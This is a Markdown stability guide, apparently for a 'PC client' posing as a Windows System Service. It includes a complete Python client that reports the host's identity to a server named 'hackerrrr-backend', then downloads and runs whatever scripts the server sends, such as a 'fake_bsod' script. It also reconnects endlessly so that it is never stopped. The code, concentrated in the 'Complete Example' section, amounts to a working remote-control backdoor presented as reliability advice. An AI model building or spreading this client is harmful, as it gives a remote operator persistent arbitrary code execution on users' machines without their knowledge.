# PC Client Error Handling & Stability Guide

## Preventing Random Shutdowns and Connection Issues

This guide addresses common issues where the PC client (Windows System Service) closes randomly during script execution or loses connection to the server.

---

## Table of Contents

1. [Common Issues](#common-issues)
2. [Connection Stability](#connection-stability)
3. [Error Handling Best Practices](#error-handling-best-practices)
4. [Reconnection Logic](#reconnection-logic)
5. [Script Execution Safety](#script-execution-safety)
6. [Troubleshooting](#troubleshooting)

---

## Common Issues

### Issue 1: PC Client Closes During Script Execution

**Symptoms:**
- PC goes offline during script execution
- Script completes but results never reach server
- Connection closes right after sending log messages
- Error: `websocket connection closed`

**Root Causes:**
1. WebSocket connection closes unexpectedly during script execution
2. No automatic reconnection during script execution
3. Errors in script execution cause PC client to crash
4. Network interruptions during long-running scripts

### Issue 2: Connection Drops Randomly

**Symptoms:**
- Connection closes with code 1006 (abnormal closure)
- Messages queued but never sent
- Heartbeat fails repeatedly
- Error: `AttributeError: 'NoneType' object has no attribute 'resume_reading'`

**Root Causes:**
1. Server closes connection (timeout, error, restart)
2. Network issues (firewall, proxy, unstable connection)
3. Large message size causing connection drop
4. SSL/TLS handshake failures

### Issue 3: Script Execution Errors

**Symptoms:**
- Script fails with `ValueError: invalid literal for int()`
- Script crashes PC client
- Environment variables not set correctly
- Import errors in scripts

---

## Connection Stability

### 1. Implement Robust Reconnection Logic

**CRITICAL**: The PC client MUST reconnect automatically when connection drops, even during script execution.

```python
async def connect_to_server():
    """Main connection loop with robust reconnection"""
    max_reconnect_delay = 60  # Maximum 60 seconds between reconnects
    reconnect_delay = 1  # Start with 1 second
    
    while True:
        try:
            async with websockets.connect(
                WS_URI,
                ping_interval=20,  # Send ping every 20 seconds
                ping_timeout=10,   # Wait 10 seconds for pong
                close_timeout=10   # Wait 10 seconds for close
            ) as websocket:
                print(f"[+] Connected to server as {PC_ID}")
                
                # Reset reconnect delay on successful connection
                reconnect_delay = 1
                
                # Send PC info immediately
                await send_pc_info(websocket)
                
                # Start heartbeat
                heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
                
                # Listen for messages
                await listen_for_messages(websocket)
                
        except websockets.exceptions.ConnectionClosed as e:
            print(f"[!] Connection closed: code={e.code}, reason={e.reason}")
            # Reconnect with exponential backoff
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, max_reconnect_delay)
            
        except Exception as e:
            print(f"[!] Connection error: {e}, reconnecting in {reconnect_delay}s...")
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, max_reconnect_delay)
```

### 2. Handle Connection Drops During Script Execution

**CRITICAL**: When connection drops during script execution, the PC client must:
1. Continue script execution
2. Queue messages for later
3. Reconnect automatically
4. Send queued messages after reconnection

```python
# Message queue for when connection is closed
message_queue = asyncio.Queue()

async def send_message_safe(websocket, message):
    """Send message with automatic queuing if connection is closed"""
    try:
        # Check if connection is open
        if websocket.closed:
            # Queue message for later
            await message_queue.put(message)
            print(f"[!] Connection closed, queued message: {message.get('type')}")
            return False
        
        # Try to send
        await websocket.send(json.dumps(message))
        return True
        
    except websockets.exceptions.ConnectionClosed:
        # Queue message for later
        await message_queue.put(message)
        print(f"[!] Connection closed during send, queued message: {message.get('type')}")
        return False
    except Exception as e:
        print(f"[!] Error sending message: {e}")
        # Queue for retry
        await message_queue.put(message)
        return False

async def send_queued_messages(websocket):
    """Send all queued messages after reconnection"""
    count = 0
    while not message_queue.empty():
        try:
            message = await message_queue.get_nowait()
            await websocket.send(json.dumps(message))
            count += 1
        except asyncio.QueueEmpty:
            break
        except Exception as e:
            print(f"[!] Error sending queued message: {e}")
            # Put back in queue for later
            await message_queue.put(message)
            break
    
    if count > 0:
        print(f"[+] Sent {count} queued messages after reconnection")
```

### 3. Heartbeat During Script Execution

**CRITICAL**: Continue sending heartbeats even during script execution to keep connection alive.

```python
async def send_heartbeat_during_script(websocket, script_name):
    """Send heartbeat during script execution to prevent timeout"""
    while True:
        try:
            await asyncio.sleep(5)  # Every 5 seconds
            
            # Check if connection is still open
            if websocket.closed:
                print(f"[!] Connection closed during {script_name} execution")
                break
            
            # Send heartbeat
            await send_message_safe(websocket, {"type": "heartbeat"})
            
        except Exception as e:
            print(f"[!] Error sending heartbeat during script: {e}")
            break
```

---

## Error Handling Best Practices

### 1. Wrap All Critical Operations in Try-Except

**NEVER** let unhandled exceptions crash the PC client:

```python
async def execute_script(script_content, script_name, server_url, execution_id, script_params):
    """Execute script with comprehensive error handling"""
    try:
        # Create temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script_content)
            temp_script = f.name
        
        # Set environment variables with validation
        for key, value in script_params.items():
            # Validate value is not None or empty
            if value is not None and str(value).strip():
                os.environ[key] = str(value)
            else:
                print(f"[!] Warning: Parameter {key} is empty, skipping")
        
        # Execute with timeout
        result = subprocess.run(
            [sys.executable, temp_script],
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "success" if result.returncode == 0 else "failed",
            "result": {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        }
        
    except subprocess.TimeoutExpired:
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "failed",
            "error_message": "Script execution timeout (5 minutes)"
        }
    except Exception as e:
        # Log error but don't crash
        print(f"[!] Error executing script: {e}")
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "failed",
            "error_message": str(e)
        }
    finally:
        # Always clean up temp file
        try:
            if 'temp_script' in locals():
                os.unlink(temp_script)
        except:
            pass
```

### 2. Handle Environment Variable Errors

**CRITICAL**: Scripts may receive empty or invalid environment variables. Always validate:

```python
# BAD - Will crash on empty string
DURATION = int(os.environ.get("BSOD_DURATION", "30"))

# GOOD - Handles empty string and invalid values
bsod_duration_str = os.environ.get("BSOD_DURATION", "30")
try:
    DURATION = min(int(bsod_duration_str) if bsod_duration_str.strip() else 30, 300)
except (ValueError, AttributeError):
    DURATION = 30  # Default to 30 seconds if invalid
```

### 3. Handle WebSocket Receive Errors

**CRITICAL**: When connection is closed, receiving messages will fail. Handle gracefully:

```python
async def listen_for_messages(websocket):
    """Listen for messages with error handling"""
    while True:
        try:
            # Check if connection is closed before receiving
            if websocket.closed:
                print("[!] Connection closed, exiting listen loop")
                break
            
            message = await asyncio.wait_for(websocket.recv(), timeout=30.0)
            data = json.loads(message)
            # Handle message...
            
        except asyncio.TimeoutError:
            # Normal timeout - continue
            continue
            
        except websockets.exceptions.ConnectionClosed:
            print("[!] Connection closed during receive")
            break
            
        except AttributeError as e:
            # Handle 'NoneType' object has no attribute 'resume_reading'
            if 'resume_reading' in str(e):
                print("[!] Connection closed (resume_reading error)")
                break
            raise  # Re-raise other AttributeErrors
            
        except Exception as e:
            print(f"[!] Error receiving message: {e}")
            # Continue listening unless it's a critical error
            if 'connection' in str(e).lower() or 'closed' in str(e).lower():
                break
            continue
```

---

## Reconnection Logic

### Automatic Reconnection During Script Execution

**CRITICAL**: The PC client must reconnect even if a script is running:

```python
async def execute_script_with_reconnection(websocket, script_content, script_name, execution_id):
    """Execute script and handle reconnection if connection drops"""
    
    # Start heartbeat task for this script
    heartbeat_task = asyncio.create_task(send_heartbeat_during_script(websocket, script_name))
    
    try:
        # Execute script
        result = await execute_script(script_content, script_name, execution_id)
        
        # Send result (will queue if connection is closed)
        await send_message_safe(websocket, result)
        
    finally:
        # Stop heartbeat task
        heartbeat_task.cancel()
        try:
            await heartbeat_task
        except asyncio.CancelledError:
            pass
```

### Reconnection After Connection Loss

```python
async def connect_to_server():
    """Main connection loop with message queue"""
    while True:
        try:
            async with websockets.connect(WS_URI) as websocket:
                print(f"[+] Connected to server as {PC_ID}")
                
                # Send PC info
                await send_pc_info(websocket)
                
                # Send any queued messages from previous connection
                await send_queued_messages(websocket)
                
                # Start heartbeat
                heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
                
                # Listen for messages
                await listen_for_messages(websocket)
                
        except websockets.exceptions.ConnectionClosed:
            print("[!] Connection closed, reconnecting...")
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[!] Connection error: {e}, reconnecting...")
            await asyncio.sleep(1)
```

---

## Script Execution Safety

### 1. Validate Environment Variables

All scripts must validate environment variables before use:

```python
# Example: fake_bsod.py
bsod_duration_str = os.environ.get("BSOD_DURATION", "30")
try:
    DURATION = min(int(bsod_duration_str) if bsod_duration_str.strip() else 30, 300)
except (ValueError, AttributeError):
    DURATION = 30  # Default
```

### 2. Handle Import Errors

Scripts should handle missing dependencies gracefully:

```python
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("[!] qrcode library not available - QR code will show as white square")
```

### 3. Set Timeouts

All long-running operations must have timeouts:

```python
# Script execution timeout
result = subprocess.run(
    [sys.executable, temp_script],
    timeout=300  # 5 minutes max
)

# Network operation timeout
message = await asyncio.wait_for(websocket.recv(), timeout=30.0)
```

---

## Troubleshooting

### Problem: PC Client Closes During Script Execution

**Solution:**
1. Check if connection is being closed by server (check server logs)
2. Implement message queue for reconnection
3. Continue script execution even if connection drops
4. Send results after reconnection

### Problem: Connection Drops Randomly

**Solution:**
1. Increase ping interval and timeout
2. Implement exponential backoff reconnection
3. Check network stability (firewall, proxy)
4. Monitor server logs for connection errors

### Problem: Script Execution Errors

**Solution:**
1. Validate all environment variables before use
2. Handle empty strings and None values
3. Provide default values for all parameters
4. Wrap script execution in try-except

### Problem: Messages Not Sent After Reconnection

**Solution:**
1. Implement message queue
2. Send queued messages immediately after reconnection
3. Limit queue size to prevent memory issues
4. Log queue status for debugging

---

## Complete Example: Robust PC Client

```python
"""
Robust PC Client with Error Handling and Reconnection
"""
import asyncio
import json
import websockets
import socket
import subprocess
import sys
import os
import tempfile
import platform

# Configuration
SERVER_URL = "wss://hackerrrr-backend.onrender.com"
PC_ID = socket.gethostname()
WS_URI = f"{SERVER_URL}/ws/{PC_ID}"

# Message queue for reconnection
message_queue = asyncio.Queue()
MAX_QUEUE_SIZE = 100

async def send_message_safe(websocket, message):
    """Send message with automatic queuing if connection is closed"""
    try:
        if websocket.closed:
            if message_queue.qsize() < MAX_QUEUE_SIZE:
                await message_queue.put(message)
                print(f"[!] Connection closed, queued: {message.get('type')}")
            else:
                print(f"[!] Queue full, dropping message: {message.get('type')}")
            return False
        
        await websocket.send(json.dumps(message))
        return True
        
    except websockets.exceptions.ConnectionClosed:
        if message_queue.qsize() < MAX_QUEUE_SIZE:
            await message_queue.put(message)
        return False
    except Exception as e:
        print(f"[!] Error sending message: {e}")
        return False

async def send_queued_messages(websocket):
    """Send all queued messages after reconnection"""
    count = 0
    while not message_queue.empty() and count < MAX_QUEUE_SIZE:
        try:
            message = await message_queue.get_nowait()
            await websocket.send(json.dumps(message))
            count += 1
        except asyncio.QueueEmpty:
            break
        except Exception as e:
            print(f"[!] Error sending queued message: {e}")
            await message_queue.put(message)
            break
    
    if count > 0:
        print(f"[+] Sent {count} queued messages after reconnection")

async def send_pc_info(websocket):
    """Send PC information"""
    ip_address = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
    except:
        pass
    
    await send_message_safe(websocket, {
        "type": "pc_info",
        "ip_address": ip_address,
        "hostname": socket.gethostname(),
        "name": socket.gethostname(),
        "os_info": {
            "platform": platform.system(),
            "version": platform.version(),
            "architecture": platform.machine()
        }
    })

async def send_heartbeat(websocket):
    """Send heartbeat every 5 seconds"""
    while True:
        try:
            await asyncio.sleep(5)
            await send_message_safe(websocket, {"type": "heartbeat"})
        except:
            break

async def execute_script(script_content, script_name, server_url, execution_id, script_params):
    """Execute script with error handling"""
    temp_script = None
    try:
        # Create temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script_content)
            temp_script = f.name
        
        # Set environment variables with validation
        for key, value in script_params.items():
            if value is not None and str(value).strip():
                os.environ[key] = str(value)
        
        # Execute
        result = subprocess.run(
            [sys.executable, temp_script],
            capture_output=True,
            text=True,
            timeout=300
        )
        
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "success" if result.returncode == 0 else "failed",
            "result": {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        }
        
    except subprocess.TimeoutExpired:
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "failed",
            "error_message": "Script execution timeout"
        }
    except Exception as e:
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "failed",
            "error_message": str(e)
        }
    finally:
        if temp_script:
            try:
                os.unlink(temp_script)
            except:
                pass

async def listen_for_messages(websocket):
    """Listen for messages with error handling"""
    while True:
        try:
            if websocket.closed:
                break
            
            message = await asyncio.wait_for(websocket.recv(), timeout=30.0)
            data = json.loads(message)
            message_type = data.get("type")
            
            if message_type == "script":
                # Execute script in background
                asyncio.create_task(handle_script(websocket, data))
            
            elif message_type == "connection":
                print(f"[*] {data.get('message')}")
                await send_message_safe(websocket, {
                    "type": "status",
                    "message": f"PC {PC_ID} ready"
                })
            
        except asyncio.TimeoutError:
            continue
        except websockets.exceptions.ConnectionClosed:
            break
        except AttributeError as e:
            if 'resume_reading' in str(e):
                break
            raise
        except Exception as e:
            print(f"[!] Error: {e}")
            if 'connection' in str(e).lower() or 'closed' in str(e).lower():
                break
            continue

async def handle_script(websocket, data):
    """Handle script execution"""
    script_name = data.get("script_name")
    execution_id = data.get("execution_id")
    
    # Start heartbeat during script
    heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
    
    try:
        result = await execute_script(
            data.get("script_content"),
            script_name,
            data.get("server_url"),
            execution_id,
            data.get("script_params", {})
        )
        await send_message_safe(websocket, result)
    finally:
        heartbeat_task.cancel()

async def connect_to_server():
    """Main connection loop"""
    reconnect_delay = 1
    max_delay = 60
    
    while True:
        try:
            async with websockets.connect(
                WS_URI,
                ping_interval=20,
                ping_timeout=10,
                close_timeout=10
            ) as websocket:
                print(f"[+] Connected as {PC_ID}")
                reconnect_delay = 1
                
                await send_pc_info(websocket)
                await send_queued_messages(websocket)
                
                heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
                await listen_for_messages(websocket)
                
        except websockets.exceptions.ConnectionClosed:
            print(f"[!] Connection closed, reconnecting in {reconnect_delay}s...")
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, max_delay)
        except Exception as e:
            print(f"[!] Error: {e}, reconnecting in {reconnect_delay}s...")
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, max_delay)

if __name__ == "__main__":
    asyncio.run(connect_to_server())
```

---

## Summary

**Key Points:**
1. **Always reconnect** - Never let connection loss stop the PC client
2. **Queue messages** - Store messages when connection is closed
3. **Validate inputs** - Check all environment variables and parameters
4. **Handle errors** - Wrap all operations in try-except
5. **Continue execution** - Don't stop script execution if connection drops
6. **Send after reconnect** - Send queued messages immediately after reconnection

**Critical Rules:**
- ✅ Reconnect automatically on connection loss
- ✅ Queue messages when connection is closed
- ✅ Continue script execution even if connection drops
- ✅ Validate all environment variables
- ✅ Handle all exceptions gracefully
- ✅ Never crash the PC client

---

**Last Updated:** 2026-01-12  
**Version:** 1.0  
**Status:** Complete

